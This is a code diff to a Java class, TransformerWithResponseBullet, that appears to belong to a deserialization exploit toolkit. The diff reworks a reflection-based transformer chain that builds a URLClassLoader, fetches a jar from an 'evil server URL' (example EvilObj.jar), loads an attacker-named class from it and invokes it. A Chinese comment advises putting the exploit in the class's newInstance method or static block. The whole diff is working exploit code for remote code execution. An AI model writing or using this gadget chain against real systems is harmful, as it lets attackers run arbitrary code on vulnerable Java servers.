@@ -15,8 +15,8 @@ import java.util.LinkedList;
 public class TransformerWithResponseBullet extends AbstractTransformerBullet {
 
     @NotNull
-    @Require(name = "args" ,detail = "evil server URL")
-    public String args;
+    @Require(name = "jarUrl" ,detail = "evil server URL, like http://localhost:80/EvilObj.jar")
+    public String jarUrl;
 
     @NotNull
     @Require(name="remoteObj", detail = "remote object name")
@@ -35,25 +35,26 @@ public class TransformerWithResponseBullet extends AbstractTransformerBullet {
     @Override
     public Object getObject() throws Exception {
         initClazz(version);
+
         LinkedList<Object> transformers = new LinkedList<>();
         transformers.add(createConstantTransformer(URLClassLoader.class));
-        transformers.add(createInvokerTransformer("getConstructor",
-                new Class[] { Class[].class },
-                new Object[] { new Class[] { java.net.URL[].class } }));
-        transformers.add(createInvokerTransformer("newInstance",
-                new Class[] { Object[].class },
-                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
-                        args) } } }));
+        transformers.add(createInvokerTransformer("getMethod",
+                new Class[] {String.class, Class[].class }, new Object[] {"newInstance", new Class[]{java.net.URL[].class} }));
+        transformers.add(createInvokerTransformer("invoke",
+                new Class[] {Object.class, Object[].class },
+                new Object[] {null, new Object[] {
+                        new java.net.URL[] { new java.net.URL(jarUrl) }
+                }})
+        );
         transformers.add(createInvokerTransformer("loadClass",
                 new Class[] { String.class }, new Object[] { remoteObj }));
-        transformers.add(createInvokerTransformer("getConstructor",
-                new Class[] {  },
-                new Object[] { }));
-        transformers.add(createInvokerTransformer(
-                "newInstance",
-                new Class[] { },
-                new Object[] { }));
-        transformers.add(createConstantTransformer(1));
+        // 这里需要载入后的类存在newInstance()函数 构造时把利用放在newInstance 或者 静态块上
+        transformers.add(createInvokerTransformer("getMethod",
+                new Class[] {String.class, Class[].class }, new Object[] {"newInstance", new Class[0] }));
+        transformers.add(createInvokerTransformer("invoke",
+                new Class[] {Object.class, Object[].class },
+                new Object[] {null, new Object[]{}})
+        );
 
         return createTransformerArray(transformers);
     }
